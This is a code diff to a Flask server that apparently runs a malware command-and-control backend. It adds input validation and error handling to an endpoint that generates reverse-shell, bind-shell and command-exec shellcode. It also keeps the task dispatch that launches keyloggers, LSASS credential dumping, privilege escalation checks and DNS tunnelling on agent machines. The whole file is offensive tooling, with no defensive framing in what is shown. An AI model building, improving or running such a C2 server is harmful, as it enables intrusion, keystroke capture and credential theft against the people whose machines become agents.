@@ -57,25 +57,63 @@ def generate_shellcode():
     data = request.get_json()
     shellcode_type = data.get('type')
     encoding = data.get('encoding', 'base64')
-    
+
     try:
+        shellcode = None
+
         if shellcode_type == 'reverse':
             host = data.get('host')
             port = data.get('port')
+
+            if not host or not port:
+                return jsonify({'error': 'Host and port are required for reverse shell'}), 400
+
+            try:
+                port = int(port)
+            except ValueError:
+                return jsonify({'error': 'Port must be a number'}), 400
+
             shellcode = shellcode_gen.generate_reverse_shell(host, port)
+
         elif shellcode_type == 'bind':
             port = data.get('port')
+            if not port:
+                return jsonify({'error': 'Port is required for bind shell'}), 400
+
+            try:
+                port = int(port)
+            except ValueError:
+                return jsonify({'error': 'Port must be a number'}), 400
+
             shellcode = shellcode_gen.generate_bind_shell(port)
+
         elif shellcode_type == 'exec':
             command = data.get('command')
+            if not command:
+                return jsonify({'error': 'Command is required for exec'}), 400
+
             shellcode = shellcode_gen.generate_exec(command)
+
         else:
             return jsonify({'error': 'Invalid shellcode type'}), 400
 
+        if shellcode is None:
+            return jsonify({'error': 'Shellcode generation failed'}), 500
+
         encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)
-        return jsonify({'shellcode': encoded_shellcode})
+
+        if encoded_shellcode is None:
+            return jsonify({'error': 'Encoding failed'}), 500
+
+        return jsonify({
+            'success': True,
+            'shellcode': encoded_shellcode.decode() if isinstance(encoded_shellcode, bytes) else encoded_shellcode
+        })
+
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        import traceback
+        traceback.print_exc()
+        return jsonify({'error': f'Unexpected server error: {str(e)}'}), 500
 
 @app.route('/api/agents', methods=['GET'])
 def list_agents():
@@ -101,10 +139,10 @@ def create_task():
     agent_id = data.get('agent_id')
     task_type = data.get('type')
     task_data = data.get('data', {})
-    
+
     if not agent_id or not task_type:
         return jsonify({'status': 'error'}), 400
-        
+
     task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
     task = {
         'id': task_id,
@@ -113,11 +151,11 @@ def create_task():
         'status': 'pending',
         'timestamp': datetime.now().isoformat()
     }
-    
+
     if agent_id not in tasks:
         tasks[agent_id] = []
     tasks[agent_id].append(task)
-    
+
     # Execute task in background
     thread = threading.Thread(
         target=execute_task,
@@ -125,14 +163,13 @@ def create_task():
         daemon=True
     )
     thread.start()
-    
+
     return jsonify({'task_id': task_id})
 
 def execute_task(agent_id, task_id, task_type, task_data):
     try:
         result = None
-        
-        # Only execute Windows-specific tasks if running on Windows
+
         if IS_WINDOWS:
             if task_type == 'keylogger':
                 result = keylogger.start()
@@ -149,18 +186,17 @@ def execute_task(agent_id, task_id, task_type, task_data):
                 result = cred_dump.dump_lsass()
             elif task_type == 'privilege_escalation':
                 result = priv_esc.check_windows_services()
-        
-        # Cross-platform tasks
+
         if task_type == 'dns_tunnel':
             result = dns_tunnel.start_tunnel()
-            
+
         if result:
             results[task_id] = {
                 'agent_id': agent_id,
                 'result': result,
                 'timestamp': datetime.now().isoformat()
             }
-            
+
     except Exception as e:
         logging.error(f"Error executing task: {str(e)}")
         results[task_id] = {
@@ -182,7 +218,7 @@ def submit_result():
     task_id = data.get('task_id')
     agent_id = data.get('agent_id')
     result = data.get('result')
-    
+
     if task_id and result:
         results[task_id] = {
             'agent_id': agent_id,
@@ -193,4 +229,4 @@ def submit_result():
     return jsonify({'status': 'error'}), 400
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5001) 
+    app.run(host='0.0.0.0', port=5001)
